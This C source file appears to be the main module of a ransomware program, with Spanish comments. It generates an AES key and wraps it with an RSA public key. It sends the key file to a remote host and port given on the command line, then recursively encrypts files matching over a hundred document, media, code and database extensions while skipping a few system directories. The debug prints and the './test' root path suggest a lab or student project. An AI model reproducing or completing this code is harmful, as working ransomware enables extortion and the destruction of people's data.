#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include "lib/debug.h"
#include "lib/key_pub.h"
#include "lib/crypto.h"
#include "lib/file_handling.h"


char path[131072]="./test";
char extension[][10] = {
    ".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",
    ".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",
    ".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",
    ".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",
    ".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",
    ".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",
    ".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",
    ".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",
    ".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",
    ".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",
    ".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",
    ".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",
    ".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",
    ".mpeg",".3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",
    ".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",
    ".zip",".7zip"
}; /* agregar como lista de extensiones */
int ext_len = sizeof(extension)/(sizeof(char)*10);

int find_ext(char file[]){
    for(int i=0; i<ext_len; i++){
        if(strstr(file, extension[i]) != NULL && strstr(file,".ntd") == NULL) {
            /* que no tenga .ntd (revisar doc strstr) */
            return 1;
        }
    }
    return 0;
}

int list_files(int n, int h, char key[])
{
    /*debug
    if(h == 3){
        printf("%s\n",path);
    }*/
    DIR *d;
    struct dirent *dir;
    d = opendir(path);
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if(strcmp(dir->d_name, ".") && strcmp(dir->d_name, "..")){
                if(dir->d_type == DT_DIR){
                    if(h==0 && (!strcmp(dir->d_name,"boot") || !strcmp(dir->d_name,"etc") || !strcmp(dir->d_name,"proc"))){
                        printf("este dic %s no lo toco\n",dir->d_name);
                    }else{
                        strcat(path,"/");
                        strcat(path, dir->d_name);
                        list_files(strlen(path), h+1, key);
                    }
                    path[n] = 0;
                }else if(dir->d_type == DT_REG){
                    if(find_ext(dir->d_name)){
                        //printf("%s/%s -> Filesito\n", path,dir->d_name);
                        cifrar(path, dir->d_name, key);
                    }
                }
            }
        }
        closedir(d);
    }
    return(0);
}

void main(int argc, char * argv[]){
    if(argc != 3){
        fprintf(stderr,"No po\n");
        exit(69);
    }
    //Create flag
    debug("Creating flag");
    create_flag("./flag.ntd");
    //Key AES para el cifrado de ficheros
    debug("Flag was created...\nGenerating AES...");
    char key[48];
    strcat(key, gen_aes());
    debug("generating key_pub");
    gen_key_pub();
    debug("key_pub generated");
    debug("creating enc_file");
    create_enc_file(key);
    debug("attempting to send file to %s %s", argv[1], argv[2]);
    send_file("enviame.enc", argv[1], argv[2]);
    //Del RSA Pub
    debug("deleting RSA pub");
    rm_key_pub();
    debug("RSA pub was deleted");
    //Listar ficheros y cifrar
    debug("Encrypting files...");
    list_files(strlen(path),0,key);
    debug("Files ecrypted!");
}